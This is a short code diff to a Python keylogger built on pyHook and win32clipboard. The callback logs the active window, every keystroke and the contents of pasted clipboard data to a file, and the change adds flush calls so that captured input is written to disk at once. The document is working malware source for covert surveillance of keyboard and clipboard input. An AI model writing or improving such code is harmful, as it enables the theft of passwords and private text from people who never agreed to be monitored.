@@ -32,15 +32,18 @@ def KeyStroke(event):
 		current_window = event.WindowName
 		get_current_process()
 	if event.Ascii > 32 and event.Ascii < 127:
-		f.write(chr(event.Ascii)),
+		f.write(chr(event.Ascii))
+		f.flush(),
 	else:
 		if event.Key == "V":
 			win32clipboard.OpenClipboard()
 			pasted_value = win32clipboard.GetClipboardData()
 			win32clipboard.CloseClipboard()
-			f.write("[PASTE]-%s" % (pasted_value)),
+			f.write("[PASTE]-%s" % (pasted_value))
+			f.flush(),
 		else:
-			f.write("[%s]" % event.Key),
+			f.write("[%s]" % event.Key)
+			f.flush(),
 	return True
 
 kl = pyHook.HookManager()
